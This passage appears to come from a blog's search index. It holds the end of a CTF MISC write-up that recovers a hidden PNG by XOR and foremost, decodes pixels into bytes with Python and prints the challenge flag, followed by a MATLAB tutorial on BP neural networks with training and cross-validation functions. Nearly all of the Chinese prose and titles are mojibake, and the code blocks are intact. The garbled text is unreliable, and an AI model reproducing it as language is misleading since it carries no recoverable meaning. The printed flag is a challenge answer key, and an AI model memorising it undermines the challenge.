class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</span><br><span class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°æ–‡ä»¶<code>xor.png</code>ã€‚</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>ä½¿ç”¨äºŒè¿›åˆ¶ç¼–è¾‘å™¨è§‚å¯Ÿ<code>xor.png</code>å°¾éƒ¨ï¼Œçœ‹åˆ°æç¤ºâ€œblack and whiteâ€ï¼Œä»¥åŠâ€œIENDâ€æ ‡è¯†ï¼Œè¿™æ˜¯pngçš„æ–‡ä»¶å°¾éƒ¨ï¼Œæš—ç¤ºè¯¥æ–‡ä»¶ä¸­éšè—äº†ä¸€ä¸ªpngæ–‡ä»¶ã€‚</p><p><img src="/ctf-iæ˜¥ç§‹å·…å³°æå®¢CTF-A-Simple-CMS-loli-WP/end.png" alt="end"></p><p>ä½¿ç”¨ foremost å‘½ä»¤ç›´æ¥æå– ï¼ˆbinwalkæ²¡åµç”¨ï¼Œæ„Ÿè°¢NaNå¸ˆå‚…çš„æç¤ºOrzï¼‰ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foremost xor.png</span><br><span class="line">ls ./output/png|grep png</span><br><span class="line">00006777.png</span><br></pre></td></tr></table></figure></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>è§‚å¯Ÿpngæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è‰²å—åˆ†ä¸º11åˆ—ï¼Œæ¯åˆ—éš”è¡Œçš„è‰²å—æ°¸è¿œæ˜¯é»‘è‰²ï¼Œè¿™è¯´æ˜åº”è¯¥æ¨ªå‘è¯»å–å›¾ç‰‡ï¼Œè€Œåˆ—ä¸­çš„æ¨ªé•¿æ¡ç”±8ä¸ªå°è‰²å—ç»„æˆï¼Œæ˜¾ç„¶å…¶ä»£è¡¨çš„æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p><p><img src="/ctf-iæ˜¥ç§‹å·…å³°æå®¢CTF-A-Simple-CMS-loli-WP/out.png" alt="out"></p><p>æŒ‰ä¸Šè¿°æ€è·¯æå–è¯¥ä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg  <span class="comment"># mpimg ç”¨äºè¯»å–å›¾ç‰‡5:18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># png[y][x][rgb]</span></span><br><span class="line"></span><br><span class="line">res_str = []</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpng</span><span class="params">()</span>:</span></span><br><span class="line">    png = mpimg.imread(<span class="string">'./out.png'</span>)</span><br><span class="line">    yy, xx, depth = png.shape</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(yy):</span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, xx - <span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">                _str = <span class="string">"0b"</span> + str(int(png[y][x][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">1</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">2</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">3</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">4</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">5</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">6</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">7</span>][<span class="number">0</span>]))</span><br><span class="line">                res_str.append(_str)</span><br><span class="line">                res.append(bin2hex(_str))</span><br><span class="line">    <span class="keyword">print</span> res_str</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'res.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> res:</span><br><span class="line">            f.write(chr(each))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(_bin=<span class="string">"0b101"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(_bin, <span class="number">2</span>) ^ <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    readpng()</span><br><span class="line">    <span class="comment">#  bin2hex("0b101")</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„<code>res.bin</code>å®é™…ä¸ºæ–‡æœ¬æ–‡ä»¶ï¼Œæ‰“å¼€å³å¯çœ‹åˆ°flagï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat res.bin</span><br><span class="line">Let<span class="string">'s look this lyrics:The black sky hangs down,The bright stars follow,The insect winged insect flies,Who are you missing,The space star bursts into tears,The ground rose withers,The cold wind blows the cold wind to blow,So long as has you to accompany,The insect fly rests,A pair of pair only then beautiful,Did not fear darkness only fears brokenheartedly,No matter is tired,Also no matter four cardinal points.Emmmm,It looks like you don'</span>t care about this lyrics. Well, this is flag:flag&#123;e0754197-e3ab-4d0d-b98f-96174c378a34&#125;Let<span class="string">'s look this lyric</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¥ç»ç½‘ç»œâ€”â€”æ•°å€¼åˆ†æé—®é¢˜çš„æœ€åæ€æ‰‹é”</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%E6%9D%80%E6%89%8B%E9%94%8F/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90%E9%97%AE%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%E6%9D%80%E6%89%8B%E9%94%8F/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘åˆšæ¥è§¦ç¥ç»ç½‘ç»œçš„é‚£ä¼šå®ƒè¿˜æ²¡æœ‰åƒç°åœ¨é‚£ä¹ˆç«çƒ­ï¼Œå½“æ—¶æˆ‘å¯¹å®ƒçš„æ•ˆæœå¾ˆä¸å±‘ï¼Œå› ä¸ºå®ƒåœ¨å°æ ·æœ¬çš„æ—¶å€™æ•ˆæœå¾ˆå·®ï¼Œä½†æ˜¯åˆ°äº†ç ”ç©¶ç”Ÿé˜¶æ®µå†æ¬¡é‡åˆ°å®ƒçš„æ—¶å€™æˆ‘å¯¹å®ƒæœ‰äº†æ–°çš„è®¤è¯†ï¼ŒåŒ…æ‹¬å…¶å†…éƒ¨çš„ç®—æ³•ï¼Œæœ‰æ—¶é—´çš„è¯ä¼šå¦å¼€ä¸€æ–‡å†è®®ï¼Œæœ¬æ–‡ä¸º16å¹´æˆ‘åœ¨æ•°å­¦å»ºæ¨¡ä¸­å¯¹ç¥ç»ç½‘ç»œç®—æ³•çš„ç†è§£ã€‚</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>ç¥ç»ç½‘ç»œä¸ä¹‹å‰çš„æ¨¡æ‹Ÿé€€ç«,é—ä¼ ç®—æ³•å¹¶ç§°ä¸ºä¸‰å¤§æ™ºèƒ½ç®—æ³•.ä½†å…¶ä¸åä¸¤è€…çš„åŠŸèƒ½å®Œå…¨ä¸åŒ.ä»–æ‰€è§£å†³çš„ä¸æ˜¯ä¼˜åŒ–é—®é¢˜,è€Œæ˜¯ç±»ä¼¼äºæ‹Ÿåˆ,æ’å€¼çš„é—®é¢˜.<br>è™½ç„¶å…¶ç®—æ³•ç†è®ºå¤æ‚,ä½†æ˜¯ç”±äºåœ¨MATLABä¸­çš„æ˜“äºä½¿ç”¨,æ‰€ä»¥ä¹Ÿæ˜¯å¤„ç†æ•°å€¼åˆ†æé—®é¢˜çš„æœ€åæ€æ‰‹é”.</p><a id="more"></a><p><img src="/æ•°æ¨¡-ç¥ç»ç½‘ç»œâ€”â€”æ•°å€¼åˆ†æé—®é¢˜çš„æœ€åæ€æ‰‹é”/nnet.jpg" alt="nnet"></p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>ç¥ç»ç½‘ç»œåªæ˜¯ä¸€ä¸ªä¸€ç±»ç®—æ³•çš„æ€»ç§°,ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºå…¶ä¸­ä¸€ä¸ªæœ€å¸¸è§,ä¹Ÿæ˜¯æœ€é€šç”¨çš„ä¸€ç§â€”BPç¥ç»ç½‘ç»œ.<br>ä¾‹1:ä½¿ç”¨ç¥ç»ç½‘ç»œåš<code>x^2+y^2</code>çš„æ’å€¼</p><ol><li><p>ç¡®å®šè‡ªå˜é‡ä¸ºpè¡Œqåˆ—çŸ©é˜µ,pæŒ‡å®éªŒæ¬¡æ•°,qæŒ‡è‡ªå˜é‡ä¸ªæ•°:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2]</span><br></pre></td></tr></table></figure></li><li><p>ç¡®å®šå› å˜é‡ä¸ºpè¡Œråˆ—çŸ©é˜µ,pæŒ‡å®éªŒæ¬¡æ•°,ræŒ‡å› å˜é‡ä¸ªæ•°:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>æ‹·è´<code>EzBp.m</code>æ–‡ä»¶åˆ°å½“å‰ç›®å½•,è°ƒç”¨å‡½æ•°<code>EzBP(x,y)</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[net,is,os]=EzBP(x,y);</span><br></pre></td></tr></table></figure><p>è‹¥å¼¹å‡ºç¥ç»ç½‘ç»œçš„æ§åˆ¶å°,å¦‚:</p><p><img src="/æ•°æ¨¡-ç¥ç»ç½‘ç»œâ€”â€”æ•°å€¼åˆ†æé—®é¢˜çš„æœ€åæ€æ‰‹é”/nnet_train.jpg" alt="nnet_train"></p><p>è¡¨æ˜æˆåŠŸ.</p></li><li><p>æµ‹è¯•ç»“æœ.netè¡¨ç¤ºå­¦ä¹ å®Œæ¯•çš„ç¥ç»ç½‘ç»œ,isæ–¹ä¾¿æˆ‘ä»¬å¯¹æµ‹è¯•æ•°æ®å½’ä¸€åŒ–,osæ–¹ä¾¿æˆ‘ä»¬å°†ç¥ç»ç½‘ç»œçš„è¿”å›çš„ç»“æœåå½’ä¸€åŒ–,å¾—åˆ°æˆ‘ä»¬çš„ç»“æœ.<br>ç°åœ¨æˆ‘ä»¬ç”¨(11,11)æµ‹è¯•ä¸€ä¸‹(æ­£ç¡®ç»“æœåº”è¯¥æ˜¯11^2+11^2=242).</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">testnum=[<span class="number">11</span>,<span class="number">11</span>]'</span><br><span class="line"><span class="comment">%è¾“å…¥å€¼å½’ä¸€åŒ–</span></span><br><span class="line">inputNum=mapminmax(<span class="string">'apply'</span>,testNum,is);</span><br><span class="line"><span class="comment">%æ”¾å…¥ç¥ç»ç½‘ç»œ,è¿›è¡Œè®¡ç®—</span></span><br><span class="line">outputNum=net(inputNum);</span><br><span class="line"><span class="comment">%å°†ç¥ç»ç½‘ç»œçš„å€¼åå½’ä¸€åŒ–</span></span><br><span class="line">res=mapminmax(<span class="string">'reverse'</span>,outputNum,os)</span><br></pre></td></tr></table></figure><p> ç»“æœ(ä½ çš„å¯èƒ½è·Ÿæˆ‘ä¸ä¸€æ ·):</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res =</span><br><span class="line">  <span class="number">245.5549</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="å‡½æ•°å†…éƒ¨æºç "><a href="#å‡½æ•°å†…éƒ¨æºç " class="headerlink" title="å‡½æ•°å†…éƒ¨æºç "></a>å‡½æ•°å†…éƒ¨æºç </h1><p>æ•´ä¸ªå‡½æ•°ä¸éš¾,ç»“åˆä¸€ä¸‹æµç¨‹å›¾è‡ªå·±å°±èƒ½çœ‹æ‡‚.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[net,ps,ts]</span>=<span class="title">EzBP</span><span class="params">(P,T,x)</span>;</span></span><br><span class="line">    <span class="comment">% input xä¸ªä½“åˆå§‹æƒå€¼å’Œé˜€å€¼</span></span><br><span class="line">    <span class="comment">% input Pæ ·æœ¬è¾“å…¥(n line,1 col)</span></span><br><span class="line">    <span class="comment">% input Tæ ·æœ¬è¾“å‡º(n line,1 col)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">% output net BPç¥ç»ç½‘ç»œ</span></span><br><span class="line">    <span class="comment">% output ps  è¾“å…¥å€¼å½’ä¸€åŒ–çŸ©é˜µ</span></span><br><span class="line">    <span class="comment">% output ts  è¾“å‡ºå€¼å½’ä¸€åŒ–çŸ©é˜µ</span></span><br><span class="line"></span><br><span class="line">    nntwarn off     <span class="comment">%å…³é—­è­¦å‘Š</span></span><br><span class="line">    P=P';</span><br><span class="line">    T=T';</span><br><span class="line">    <span class="comment">%æ•°æ®é¢„å¤„ç†--å½’ä¸€åŒ–å¤„ç†</span></span><br><span class="line">    [P,ps]=mapminmax(P);</span><br><span class="line">    [T,ts]=mapminmax(T);</span><br><span class="line">    [pr,pc]=<span class="built_in">size</span>(P);</span><br><span class="line">    [tr,tc]=<span class="built_in">size</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">%è®¾ç½®éšè—ç¥ç»å…ƒä¸ªæ•°,ä¸€èˆ¬è®¾ç½®2*inputNum+1</span></span><br><span class="line">    inputNum=pr;</span><br><span class="line">    outputNum=tr;</span><br><span class="line">    hiddenNum=<span class="number">2</span>*inputNum+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">%æ–°å»ºä¸€ä¸ªç¥ç»ç½‘ç»œå¯¹è±¡,è¿™é‡Œé‡‡ç”¨tansigçš„æ¿€åŠ±ç®—å­,è¿™ä¸ªç®—å­å¯¹éçº¿æ€§çš„æ’å€¼è®¡ç®—æ•ˆæœè¾ƒå¥½</span></span><br><span class="line">    net=newff(minmax(P),[hiddenNum,outputNum],&#123;<span class="string">'tansig'</span>,<span class="string">'tansig'</span>&#125;); <span class="comment">%éšå«å±‚ è¾“å‡ºå±‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">%è®¾ç½®ç¥ç»ç½‘ç»œè®­ç»ƒçš„ç»“æŸæ¡ä»¶</span></span><br><span class="line">    net.trainParam.epochs=<span class="number">1e5</span>;</span><br><span class="line">    net.trainParam.goal=<span class="number">1e-5</span>;</span><br><span class="line">    net.trainParam.lr=<span class="number">0.05</span>;</span><br><span class="line">    net.trainParam.show=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">3</span></span><br><span class="line">        net.trainParam.showwindow=<span class="built_in">false</span>;</span><br><span class="line">        w1num=inputNum*hiddenNum;</span><br><span class="line">        w2num=outputNum*hiddenNum;</span><br><span class="line">        w1=x(<span class="number">1</span>:w1num);</span><br><span class="line">        B1=x(w1num+<span class="number">1</span>:w1num+hiddenNum);</span><br><span class="line">        w2=x(w1num+hiddenNum+<span class="number">1</span>:w1num+hiddenNum+w2num);</span><br><span class="line">        B2=x(w1num+hiddenNum+w2num+<span class="number">1</span>:w1num+hiddenNum+w2num+outputNum);</span><br><span class="line">        net.iw&#123;<span class="number">1</span>,<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(w1,hiddenNum,inputNum);</span><br><span class="line">        net.lw&#123;<span class="number">2</span>,<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(w2,outputNum,hiddenNum);</span><br><span class="line">        net.b&#123;<span class="number">1</span>&#125;=<span class="built_in">reshape</span>(B1,hiddenNum,<span class="number">1</span>);</span><br><span class="line">        net.b&#123;<span class="number">2</span>&#125;=<span class="built_in">reshape</span>(B2,outputNum,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment">%è®­ç»ƒ</span></span><br><span class="line">    net=train(net,P,T);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h1 id="ä¼˜åŒ–æŠ€å·§"><a href="#ä¼˜åŒ–æŠ€å·§" class="headerlink" title="ä¼˜åŒ–æŠ€å·§"></a>ä¼˜åŒ–æŠ€å·§</h1><p>ç¥ç»ç½‘ç»œçš„æ•ˆæœçš„å¥½åç”±(1)æ‰€é€‰ç”¨çš„è®­ç»ƒæ•°æ®(2)ç¥ç»å…ƒä¸ªæ•°,(3)æ¿€åŠ±ç®—å­æ‰€å†³å®š.ä¸‹é¢ä»‹ç»ä¸€äº›ç®€å•çš„ä¼˜åŒ–æ–¹æ³•.</p><h2 id="å½’ä¸€åŒ–-å–å…¸å‹å€¼"><a href="#å½’ä¸€åŒ–-å–å…¸å‹å€¼" class="headerlink" title="å½’ä¸€åŒ–,å–å…¸å‹å€¼"></a>å½’ä¸€åŒ–,å–å…¸å‹å€¼</h2><p>è¿™æ˜¯æœ€ç®€å•çš„ä¸€ç§,å½’ä¸€åŒ–åœ¨EzBPå‡½æ•°é‡Œå·²ç»é»˜è®¤æä¾›,è¯´ä¸€ä¸‹å»å…¸å‹å€¼çš„æ„æ€:</p><p>ä¸¾ä¸ªä¾‹å­,æˆ‘ä»¬è¦æ‹Ÿåˆ<code>y=2*x</code>,ç»™çš„è®­ç»ƒæ•°æ®æ˜¯<code>x=1:10,y=2*x</code>.é‚£æˆ‘æŠŠ<code>1.5</code>æ”¾è¿›å»,å‡ºæ¥çš„å€¼å¾ˆå¯èƒ½å°±æ˜¯<code>3.0Â±0.1</code>çš„å€¼,å¾ˆé è°±å§?<br>è€Œæˆ‘æŠŠ<code>100</code>æ”¾è¿›å»,å‘µå‘µ,é‚£å°±ä¸æ™“å¾—æ˜¯ä»€ä¹ˆç¦»è°±çš„å€¼äº†.ç°åœ¨çŸ¥é“ä»€ä¹ˆå«<strong>å…¸å‹</strong>çš„æ„æ€äº†å§.ä¸€èˆ¬çš„,æˆ‘ä»¬æŠŠæ¯ä¸€å˜é‡çš„æœ€å¤§å€¼å’Œæœ€ä½å€¼æ”¾åˆ°ç½‘ç»œä¸­å­¦ä¹ ,è€Œé€‰ç”¨ä¸€éƒ¨åˆ†ä¸­é—´çš„å€¼ä½œä¸ºéªŒè¯.</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[train,test]</span>=<span class="title">ChooseData</span><span class="params">(data)</span></span></span><br><span class="line">    feature=[];</span><br><span class="line">    <span class="keyword">for</span> eachCow=data</span><br><span class="line">        [maxNum,maxPos]=<span class="built_in">max</span>(eachCow);</span><br><span class="line">        [minNum,minPos]=<span class="built_in">min</span>(eachCow);</span><br><span class="line">        feature=union(feature,maxPos);</span><br><span class="line">        feature=union(feature,minPos);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    dataNum=<span class="built_in">size</span>(data,<span class="number">1</span>);</span><br><span class="line">    rand_=randperm(dataNum);</span><br><span class="line">    needToChoose=<span class="built_in">floor</span>(dataNum*<span class="number">0.9</span>)</span><br><span class="line">    train=union(feature,rand_(<span class="number">1</span>:needToChoose));</span><br><span class="line">    test=rand_(needToChoose:<span class="keyword">end</span>);</span><br><span class="line">    train=data(train,:);</span><br><span class="line">    test=data(test,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="äº¤å‰éªŒè¯"><a href="#äº¤å‰éªŒè¯" class="headerlink" title="äº¤å‰éªŒè¯"></a>äº¤å‰éªŒè¯</h2><p>äº¤å‰éªŒè¯æ˜¯åœ¨è®­ç»ƒæ•°æ®æ¯”è¾ƒå°‘çš„æƒ…å†µä¸‹,å¢åŠ è®­ç»ƒæ•°æ®çš„å¥½æ–¹æ³•.è¿™é‡Œä¹Ÿç»™å‡ºç®€å•çš„æ“ä½œå‡½æ•°<code>CvBP(x,y[,n])</code>.<code>n</code>ä¸ºå¯é€‰å‚æ•°,nè¶Šå¤§è®­ç»ƒæ•°æ®ä¼šå˜å¾—æ›´å¤š.ä½†ä¹Ÿä¸æ„å‘³ç€è®­ç»ƒç»“æœä¼šæ›´å¥½(è¿‡åˆ†å­¦ä¹ çš„æƒ…å†µ).</p><p><code>demo.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x1=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x2=[<span class="number">1</span>:<span class="number">3</span>:<span class="number">20</span>]';</span><br><span class="line">x=[x1,x2];</span><br><span class="line"></span><br><span class="line">y=x1.^<span class="number">2</span>+x2.^<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">net=CvBP(x,y,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">testNum=[<span class="number">11</span>,<span class="number">11</span>]';</span><br><span class="line"></span><br><span class="line"><span class="comment">%æ”¾å…¥ç¥ç»ç½‘ç»œ,è¿›è¡Œè®¡ç®—</span></span><br><span class="line">outputNum=net(testNum)</span><br></pre></td></tr></table></figure><p><code>CvBP.m</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">perfectNet</span>=<span class="title">CvBP</span><span class="params">(P,T,num)</span></span></span><br><span class="line">    pdata=P';</span><br><span class="line">    tdata=T';</span><br><span class="line"></span><br><span class="line">    pTrain=P;</span><br><span class="line">    tTrain=T;</span><br><span class="line"></span><br><span class="line">    n=<span class="number">10</span>;</span><br><span class="line">    <span class="comment">%% äº¤å‰éªŒè¯</span></span><br><span class="line">    mse_max=<span class="number">10e30</span>;</span><br><span class="line">    desiredInput=[];</span><br><span class="line">    desiredOutput=[];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">2</span></span><br><span class="line">        num=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    indices = crossvalind(<span class="string">'Kfold'</span>,<span class="built_in">length</span>(pTrain),num);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:num</span><br><span class="line">        perfp=[];</span><br><span class="line">        <span class="built_in">disp</span>([<span class="string">'The result of '</span>,num2str(<span class="built_in">i</span>),<span class="string">'/'</span>,num2str(num)])</span><br><span class="line">        test = (indices == <span class="built_in">i</span>); trainA = ~test;</span><br><span class="line">        pCvTrain=pTrain(trainA,:);</span><br><span class="line">        tCvTrain=tTrain(trainA,:);</span><br><span class="line">        pCvTest=pTrain(test,:);</span><br><span class="line">        tCvTest=tTrain(test,:);</span><br><span class="line">        pCvTrain=pCvTrain';</span><br><span class="line">        tCvTrain=tCvTrain';</span><br><span class="line">        pCvTest= pCvTest';</span><br><span class="line">        tCvTest= tCvTest';</span><br><span class="line"></span><br><span class="line">        nett=feedforwardnet(n);</span><br><span class="line">        <span class="comment">% net.trainParam.epochs=100000;</span></span><br><span class="line">        <span class="comment">% net.trainParam.show=200;</span></span><br><span class="line">        <span class="comment">% net.trainParam.goal=1e-4;</span></span><br><span class="line">        <span class="comment">% net=train(net,desired_input,desired_output);</span></span><br><span class="line">        nett=train(nett,pCvTrain,tCvTrain);</span><br><span class="line">        testOut=nett(pCvTest);</span><br><span class="line">        perf=perform(nett,testOut,tCvTest);</span><br><span class="line">        <span class="keyword">if</span> mse_max&gt;perf</span><br><span class="line">            perfectNet=nett;</span><br><span class="line">            mse_max=perf;</span><br><span class="line">            desiredInput=pCvTrain;</span><br><span class="line">            desiredOutput=tCvTrain;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ç»“æœ:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outputNum =</span><br><span class="line">  <span class="number">245.5549</span></span><br></pre></td></tr></table></figure><h2 id="ä¸é—ä¼ ç®—æ³•ç»“åˆ"><a 